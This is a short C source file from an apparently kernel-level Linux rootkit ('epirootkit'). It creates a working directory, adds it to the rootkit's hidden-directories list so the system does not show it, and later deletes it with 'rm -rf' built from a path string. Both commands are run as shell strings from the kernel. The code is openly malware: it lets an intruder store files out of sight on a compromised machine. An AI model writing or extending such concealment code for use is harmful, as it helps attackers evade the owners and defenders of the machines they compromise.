#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/string.h>

#include "config.h"
#include "epirootkit.h"
#include "hide.h"

int create_hidden_tmp_dir(void) {
    char cmd[128];
    int rc;

    snprintf(cmd, sizeof(cmd), "mkdir -p -- %s", HIDDEN_DIR_PATH);
    rc = exec_str_as_command(cmd, false);
    if (rc < 0)
        return rc;

    // Directly add it to your hidden‐dirs list
    add_hidden_dir(HIDDEN_DIR_PATH);

    return SUCCESS;
}

int remove_hidden_tmp_dir(void) {
    char cmd[128];
    int rc;

    // Remove it on disk
    snprintf(cmd, sizeof(cmd), "rm -rf %s", HIDDEN_DIR_PATH);
    rc = exec_str_as_command(cmd, false);
    if (rc < 0)
        return rc;

    // Directly remove it from your hidden‐dirs list
    remove_hidden_dir(HIDDEN_DIR_PATH);

    return SUCCESS;
}
